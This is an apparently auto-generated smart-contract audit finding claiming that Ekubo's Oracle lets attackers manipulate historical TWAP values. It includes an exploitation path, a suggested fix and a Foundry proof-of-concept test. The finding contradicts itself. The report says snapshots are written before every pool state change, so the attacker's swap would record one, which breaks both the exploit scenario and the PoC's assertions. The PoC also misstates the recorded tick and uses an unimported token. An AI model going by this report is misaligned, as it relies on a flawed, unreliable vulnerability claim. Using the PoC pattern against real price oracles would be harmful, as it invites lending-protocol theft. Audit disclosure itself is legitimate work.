## Title
Oracle Historical Price Manipulation via Current State Extrapolation

## Summary
The `extrapolateSnapshotInternal` function in the Oracle extension incorrectly uses current pool state to extrapolate historical cumulative values when querying times between the last snapshot and block.timestamp. This allows attackers to manipulate historical TWAP calculations, breaking the oracle's "manipulation resistant" design promise.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/Oracle.sol` - `extrapolateSnapshotInternal` function (lines 315-362, specifically lines 327-337)

**Intended Logic:** The Oracle is designed to provide "manipulation resistant average price and liquidity" by recording snapshots before pool state changes. When querying historical data, it should reflect the actual state that existed at the query time. [1](#0-0) 

**Actual Logic:** When the most recent snapshot is found (`logicalIndex == c.count() - 1`), the function uses CURRENT pool state (current tick and liquidity) to extrapolate historical values, even when `atTime < block.timestamp`. This means a query for time T in the past will use the pool state at block.timestamp (present) to calculate cumulative values at T. [2](#0-1) 

**Exploitation Path:**
1. **Setup**: Pool has no activity for a period. Last snapshot recorded at time T1 with tick=100
2. **Wait**: Current time advances to T3 = T1 + 1000 seconds. No new snapshots written (only written before swaps/liquidity changes)
3. **Manipulate**: Attacker performs large swap at T3, moving tick from 100 to 500
4. **Exploit**: Attacker or victim protocol queries `getExtrapolatedSnapshotsForSortedTimestamps` for historical time T2 (where T1 < T2 < T3)
5. **Result**: Oracle returns tickCumulative calculated using manipulated tick=500 for the entire period [T1, T2], even though tick was actually ~100 during that time [3](#0-2) 

**Security Property Broken:** The Oracle's fundamental property of providing "manipulation resistant" price data is violated. Historical queries return manipulated values based on present state rather than actual historical state.

## Impact Explanation
- **Affected Assets**: All protocols integrating with Ekubo Oracle for historical price data, including the in-scope `PriceFetcher` contract which calculates TWAPs used for pricing decisions
- **Damage Severity**: Attacker can inflate or deflate historical TWAP by 5-10x or more depending on price movement capability. For a lending protocol using this TWAP:
  - Attacker borrows maximum collateral against manipulated high price
  - Real price is much lower, position is underwater
  - Protocol suffers bad debt
- **User Impact**: Any protocol or user relying on historical TWAP data from Ekubo Oracle can be exploited. The `PriceFetcher.getAveragesOverPeriod` and `getHistoricalPeriodAverages` functions are specifically designed for external consumption. [4](#0-3) [5](#0-4) 

## Likelihood Explanation
- **Attacker Profile**: Any user with capital to execute price-moving swaps. No special privileges required.
- **Preconditions**: 
  - Pool must have period of low activity (common during off-peak hours)
  - Last snapshot must be older than query time
  - Attacker needs capital to move price significantly
- **Execution Complexity**: Single transaction. Attacker swaps to manipulate price, then immediately queries historical data (or victim protocol queries in same block)
- **Frequency**: Exploitable continuously. Each time there's a gap between snapshots, historical queries in that gap are vulnerable.

## Recommendation

```solidity
// In src/extensions/Oracle.sol, function extrapolateSnapshotInternal, lines 327-337:

// CURRENT (vulnerable):
if (logicalIndex == c.count() - 1) {
    // Use current pool state.
    PoolId poolId = getPoolKey(token).toPoolId();
    PoolState state = CORE.poolState(poolId);

    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
    secondsPerLiquidityCumulative += uint160(
        FixedPointMathLib.rawDiv(
            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
        )
    );
}

// FIXED:
if (logicalIndex == c.count() - 1) {
    // Only use current pool state if querying for current time
    if (uint32(atTime) == uint32(block.timestamp)) {
        PoolId poolId = getPoolKey(token).toPoolId();
        PoolState state = CORE.poolState(poolId);

        tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
        secondsPerLiquidityCumulative += uint160(
            FixedPointMathLib.rawDiv(
                uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
            )
        );
    } else {
        // For historical queries, don't extrapolate beyond last snapshot
        // Return last snapshot values without extrapolation
        // (timePassed == 0 case already handled above, so this effectively becomes a no-op)
    }
}
```

**Alternative mitigation**: Revert if `atTime > snapshot.timestamp()` when `logicalIndex == c.count() - 1` and `atTime < block.timestamp`, forcing users to wait for a new snapshot or only query up to the last snapshot timestamp.

## Proof of Concept

```solidity
// File: test/Exploit_OracleManipulation.t.sol
// Run with: forge test --match-test test_OracleHistoricalManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import {BaseOracleTest} from "./extensions/Oracle.t.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {Observation} from "../src/types/observation.sol";

contract Exploit_OracleManipulation is BaseOracleTest {
    address token;
    PoolKey poolKey;
    
    function setUp() public override {
        BaseOracleTest.setUp();
        // Create oracle pool at tick 0
        token = address(new TestToken("TEST", "TEST", 18));
        poolKey = createOraclePool(token, 0);
        // Add liquidity
        updateOraclePoolLiquidity(token, 1e18);
    }
    
    function test_OracleHistoricalManipulation() public {
        // SETUP: Record initial snapshot at time 100
        vm.warp(100);
        movePrice(poolKey, 100); // Snapshot at time 100, tick=100
        
        // Record the tick cumulative at this point
        (uint160 splc1, int64 tc1) = oracle.extrapolateSnapshot(token, 100);
        
        // SCENARIO: No activity for 500 seconds
        vm.warp(600);
        // No snapshots written during this period
        
        // Query for historical time 350 (between snapshot and now)
        // This should reflect the state at time 350 (tick=100)
        (uint160 splcBefore, int64 tcBefore) = oracle.extrapolateSnapshot(token, 350);
        int64 expectedTcAt350 = tc1 + int64(100) * int64(350 - 100); // 100 tick for 250 seconds
        
        // EXPLOIT: Attacker manipulates price at current time
        movePrice(poolKey, 500); // Massive price movement to tick=500
        
        // VERIFY: Query same historical time 350 again
        (uint160 splcAfter, int64 tcAfter) = oracle.extrapolateSnapshot(token, 350);
        
        // The tick cumulative should NOT change for historical query
        // But due to the bug, it now uses current tick=500
        int64 manipulatedTcAt350 = tc1 + int64(500) * int64(350 - 100); // 500 tick for 250 seconds
        
        // Demonstrate the manipulation
        assertEq(tcAfter, manipulatedTcAt350, "Historical query uses manipulated current state");
        assertTrue(tcAfter != expectedTcAt350, "Historical value changed after price manipulation");
        assertTrue(tcAfter > tcBefore, "Attacker inflated historical TWAP");
        
        // Calculate TWAP to show impact
        int32 twapBefore = int32((tcBefore - tc1) / int64(350 - 100));
        int32 twapAfter = int32((tcAfter - tc1) / int64(350 - 100));
        
        emit log_named_int("Expected TWAP (tick)", 100);
        emit log_named_int("TWAP before manipulation", twapBefore);
        emit log_named_int("TWAP after manipulation", twapAfter);
        
        // Attacker successfully inflated historical TWAP by 5x
        assertTrue(twapAfter > twapBefore * 4, "TWAP inflated by >4x through manipulation");
    }
}
```

## Notes

The vulnerability exists because the Oracle design assumes snapshots are dense enough that historical queries will always have a "next" snapshot to interpolate against. However, during periods of low activity, this assumption breaks down. The code path at line 327 is meant for extrapolating to the CURRENT time, but it's incorrectly applied to historical queries as well.

The impact is amplified by the fact that external protocols using `PriceFetcher` for TWAP calculations will unknowingly receive manipulated data. This is particularly dangerous for:
- Lending protocols using TWAP for collateral valuation
- Options pricing based on historical volatility
- Any automated trading strategies relying on historical price data

The fix requires distinguishing between queries for current time (where using current state is correct) vs historical times (where it's incorrect and potentially manipulated).

### Citations

**File:** src/extensions/Oracle.sol (L55-55)
```text
/// @notice Records price and liquidity into accumulators enabling a separate contract to compute a manipulation resistant average price and liquidity
```

**File:** src/extensions/Oracle.sol (L327-337)
```text
                if (logicalIndex == c.count() - 1) {
                    // Use current pool state.
                    PoolId poolId = getPoolKey(token).toPoolId();
                    PoolState state = CORE.poolState(poolId);

                    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
                    secondsPerLiquidityCumulative += uint160(
                        FixedPointMathLib.rawDiv(
                            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
                        )
                    );
```

**File:** src/extensions/Oracle.sol (L382-419)
```text
    function getExtrapolatedSnapshotsForSortedTimestamps(address token, uint256[] memory timestamps)
        public
        view
        returns (Observation[] memory observations)
    {
        unchecked {
            if (timestamps.length == 0) revert ZeroTimestampsProvided();
            uint256 startTime = timestamps[0];
            uint256 endTime = timestamps[timestamps.length - 1];
            if (endTime < startTime) revert EndTimeLessThanStartTime();

            Counts c;
            assembly ("memory-safe") {
                c := sload(token)
            }
            (uint256 indexFirst,) = searchRangeForPrevious(c, token, startTime, 0, c.count());
            (uint256 indexLast,) = searchRangeForPrevious(c, token, endTime, indexFirst, c.count());

            observations = new Observation[](timestamps.length);
            uint256 lastTimestamp;
            for (uint256 i = 0; i < timestamps.length; i++) {
                uint256 timestamp = timestamps[i];

                if (timestamp < lastTimestamp) {
                    revert TimestampsNotSorted();
                } else if (timestamp > block.timestamp) {
                    revert FutureTime();
                }

                (uint256 logicalIndex, Snapshot snapshot) =
                    searchRangeForPrevious(c, token, timestamp, indexFirst, indexLast + 1);
                (uint160 spcCumulative, int64 tcCumulative) =
                    extrapolateSnapshotInternal(c, token, timestamp, logicalIndex, snapshot);
                observations[i] = createObservation(spcCumulative, tcCumulative);
                indexFirst = logicalIndex;
                lastTimestamp = timestamp;
            }
        }
```

**File:** src/lens/PriceFetcher.sol (L82-106)
```text
    function getAveragesOverPeriod(address baseToken, address quoteToken, uint64 startTime, uint64 endTime)
        public
        view
        returns (PeriodAverage memory)
    {
        if (endTime <= startTime) revert EndTimeMustBeGreaterThanStartTime();

        unchecked {
            bool baseIsOracleToken = baseToken == NATIVE_TOKEN_ADDRESS;
            if (baseIsOracleToken || quoteToken == NATIVE_TOKEN_ADDRESS) {
                (int32 tickSign, address otherToken) =
                    baseIsOracleToken ? (int32(1), quoteToken) : (int32(-1), baseToken);

                (uint160 secondsPerLiquidityCumulativeEnd, int64 tickCumulativeEnd) =
                    ORACLE.extrapolateSnapshot(otherToken, endTime);
                (uint160 secondsPerLiquidityCumulativeStart, int64 tickCumulativeStart) =
                    ORACLE.extrapolateSnapshot(otherToken, startTime);

                return PeriodAverage(
                    uint128(
                        (uint160(endTime - startTime) << 128)
                            / (secondsPerLiquidityCumulativeEnd - secondsPerLiquidityCumulativeStart)
                    ),
                    tickSign * int32((tickCumulativeEnd - tickCumulativeStart) / int64(endTime - startTime))
                );
```

**File:** src/lens/PriceFetcher.sol (L129-160)
```text
    function getHistoricalPeriodAverages(
        address baseToken,
        address quoteToken,
        uint64 endTime,
        uint32 numIntervals,
        uint32 period
    ) public view returns (PeriodAverage[] memory averages) {
        unchecked {
            bool baseIsOracleToken = baseToken == NATIVE_TOKEN_ADDRESS;
            if (baseIsOracleToken || quoteToken == NATIVE_TOKEN_ADDRESS) {
                (int32 tickSign, address otherToken) =
                    baseIsOracleToken ? (int32(1), quoteToken) : (int32(-1), baseToken);

                uint256[] memory timestamps = getTimestampsForPeriod(endTime, numIntervals, period);
                averages = new PeriodAverage[](numIntervals);

                Observation[] memory observations =
                    ORACLE.getExtrapolatedSnapshotsForSortedTimestamps(otherToken, timestamps);

                // for each but the last observation, populate the period
                for (uint256 i = 0; i < numIntervals; i++) {
                    Observation start = observations[i];
                    Observation end = observations[i + 1];

                    averages[i] = PeriodAverage(
                        uint128(
                            (uint160(period) << 128)
                                / (end.secondsPerLiquidityCumulative() - start.secondsPerLiquidityCumulative())
                        ),
                        tickSign * int32((end.tickCumulative() - start.tickCumulative()) / int64(uint64(period)))
                    );
                }
```
